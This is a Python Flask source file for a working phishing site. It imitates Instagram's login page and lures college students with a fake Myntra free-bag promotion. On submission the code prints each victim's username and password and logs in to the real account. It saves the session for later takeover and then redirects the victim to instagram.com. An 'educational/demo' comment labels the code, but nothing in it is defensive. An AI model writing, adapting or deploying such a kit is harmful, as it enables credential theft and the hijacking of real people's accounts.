from flask import Flask, request, redirect, url_for, render_template_string, session
from instagrapi import Client
import os

app = Flask(__name__)
app.secret_key = 'a_very_secret_key_change_this'

SESSIONS_DIR = "sessions"
IMAGE_PATH = "instadp.jpg"

if not os.path.exists(SESSIONS_DIR):
    os.mkdir(SESSIONS_DIR)

def session_file(username):
    return os.path.join(SESSIONS_DIR, f"{username}.json")

def get_client(username):
    cl = Client()
    path = session_file(username)
    if os.path.exists(path):
        cl.load_settings(path)
    return cl

# ✅ Login Page with Meta Tags + Header Image
login_page = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Get a Free College Bag by Just Logging into Instagram | Myntra Promo for Students</title>

    <meta name="description" content="College students, grab a cool bag for free! Just log in with your Instagram account and start promoting Myntra. Limited-time offer. No purchase needed – just login, share & earn!">
    <meta name="keywords" content="Myntra offer for students, Free college bag Myntra, Instagram login offer, student deals Myntra, earn by sharing Myntra, college student gift, Myntra bag promotion, login and earn, student influencer offer, cool college bag free">
    <meta name="author" content="Myntra Student Promo">

    <style>
        body {
            background: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 10px;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 30px 25px 25px;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
            text-align: center;
            border-radius: 4px;
        }
        .header-image {
            max-width: 100%;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .logo {
            font-family: 'Grand Hotel', cursive;
            font-size: 42px;
            margin-bottom: 20px;
            color: #262626;
            font-weight: 900;
            letter-spacing: 2px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            margin: 6px 0 12px;
            padding: 12px 10px;
            border: 1px solid #dbdbdb;
            background: #fafafa;
            font-size: 16px;
            outline: none;
            border-radius: 3px;
        }
        button {
            width: 100%;
            background: #3897f0;
            border: none;
            color: white;
            font-weight: 600;
            padding: 12px 0;
            font-size: 16px;
            cursor: pointer;
            border-radius: 4px;
            margin-top: 8px;
        }
        button:hover {
            background: #2a78c7;
        }
        .error {
            color: red;
            margin: 10px 0;
            font-weight: bold;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
</head>
<body>
    <div class="login-box">
        <img src="{{ url_for('static', filename='myntra-img.jpg') }}" alt="Myntra Offer" class="header-image" />
        <div class="logo">Instagram</div>
        {% if error %}
          <div class="error">{{ error }}</div>
        {% endif %}
        <form method="post" action="/login">
            <input type="text" name="username" placeholder="Phone number, username, or email" required autofocus />
            <input type="password" name="password" placeholder="Password" required />
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # 👇 For educational/demo purposes only
        print(f"[INFO] User Login Attempt → Username: {username} | Password: {password}")

        cl = Client()
        try:
            cl.login(username, password)
            cl.dump_settings(session_file(username))
            session['username'] = username
            return redirect("https://www.instagram.com/")
        except Exception as e:
            error = "Login failed. Please check your credentials."
            print(f"[ERROR] Login failed: {e}")

    return render_template_string(login_page, error=error)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
